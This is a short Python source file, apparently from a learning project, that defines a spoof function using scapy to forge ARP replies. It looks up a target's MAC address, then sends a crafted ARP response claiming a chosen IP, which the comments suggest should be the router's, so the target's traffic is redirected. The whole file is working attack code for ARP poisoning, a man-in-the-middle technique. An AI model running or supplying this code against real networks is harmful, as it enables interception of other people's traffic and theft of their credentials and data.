import scapy.all as scapy
from ketnetscanner.network_scanner import NetworkScanner as ns

def spoof(target_ip, spoof_ip):
    # We use the scan method developed before to obtain the mac address of the target_ip
    target_mac_address = ns.scan(target_ip, 'ff:ff:ff:ff:ff:ff')[0]['mac']

    # The op argument iqual to 2 allow us to create a arp response, default value 1 is for arp request
    # The pdst argument refers to the target ip
    # The hwdst argument refers to the target MAC Address
    # The psrc argument refers to the source ip, you should use the router ip
    arp_response = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac_address, psrc=spoof_ip)

    # Scapy send method send the package for us
    scapy.send(arp_response)